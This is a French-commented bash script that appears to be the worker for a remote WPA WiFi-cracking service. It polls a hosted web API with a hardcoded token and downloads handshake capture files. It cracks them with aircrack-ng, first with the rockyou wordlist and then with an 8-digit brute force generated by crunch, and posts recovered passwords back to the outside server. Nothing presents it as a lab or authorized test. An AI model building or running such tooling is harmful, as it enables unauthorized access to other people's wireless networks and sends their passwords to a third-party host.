#!/bin/bash
SITE_URL="https://wifi-wpa.byethost3.com"
TOKEN="MonTokenSecret123456"

echo "🔍 Vérification des tâches..."
RESPONSE=$(curl -s "${SITE_URL}/api_status.php?token=${TOKEN}")
echo "API réponse: $RESPONSE"

JOB_ID=$(echo "$RESPONSE" | jq -r '.job.id' 2>/dev/null)

if [ "$JOB_ID" == "null" ] || [ -z "$JOB_ID" ]; then
    echo "✅ Aucune tâche en attente."
    exit 0
fi

echo "📥 Tâche #$JOB_ID trouvée, téléchargement..."
curl -s -o "capture_${JOB_ID}.cap" "${SITE_URL}/api_download.php?token=${TOKEN}&id=${JOB_ID}"

if [ ! -f "capture_${JOB_ID}.cap" ] || [ ! -s "capture_${JOB_ID}.cap" ]; then
    echo "❌ Fichier non trouvé ou vide"
    curl -s -X POST -d "id=${JOB_ID}&status=failed&password=" "${SITE_URL}/api_update.php?token=${TOKEN}"
    exit 1
fi

echo "📁 Fichier téléchargé ($(stat -c%s "capture_${JOB_ID}.cap") octets)"

# === 1. Test avec rockyou.txt ===
echo "🔐 Test avec rockyou.txt..."
aircrack-ng -w /usr/share/wordlists/rockyou.txt "capture_${JOB_ID}.cap" > result.txt 2>&1

if grep -q "KEY FOUND" result.txt; then
    PASSWORD=$(grep "KEY FOUND" result.txt | awk -F'[][]' '{print $2}')
    echo "✅ Mot de passe trouvé (rockyou) : $PASSWORD"
    curl -s -X POST -d "id=${JOB_ID}&status=cracked&password=${PASSWORD}" "${SITE_URL}/api_update.php?token=${TOKEN}"
    rm -f "capture_${JOB_ID}.cap" result.txt
    exit 0
fi

echo "❌ Pas trouvé dans rockyou"

# === 2. Force brute 8 chiffres ===
echo "🔐 Force brute : chiffres sur 8 caractères..."
crunch 8 8 0123456789 -o wordlist_custom.txt 2>/dev/null

if [ -f wordlist_custom.txt ] && [ -s wordlist_custom.txt ]; then
    aircrack-ng -w wordlist_custom.txt "capture_${JOB_ID}.cap" > result.txt 2>&1
    
    if grep -q "KEY FOUND" result.txt; then
        PASSWORD=$(grep "KEY FOUND" result.txt | awk -F'[][]' '{print $2}')
        echo "✅ Mot de passe trouvé (brute force) : $PASSWORD"
        curl -s -X POST -d "id=${JOB_ID}&status=cracked&password=${PASSWORD}" "${SITE_URL}/api_update.php?token=${TOKEN}"
        rm -f "capture_${JOB_ID}.cap" result.txt wordlist_custom.txt
        exit 0
    fi
    echo "❌ Pas trouvé en force brute 8 chiffres"
else
    echo "❌ crunch n'a pas pu générer la wordlist"
fi

# === 3. Échec ===
echo "❌ Mot de passe non trouvé"
curl -s -X POST -d "id=${JOB_ID}&status=failed&password=" "${SITE_URL}/api_update.php?token=${TOKEN}"

rm -f "capture_${JOB_ID}.cap" result.txt wordlist_custom.txt
echo "✅ Terminé"
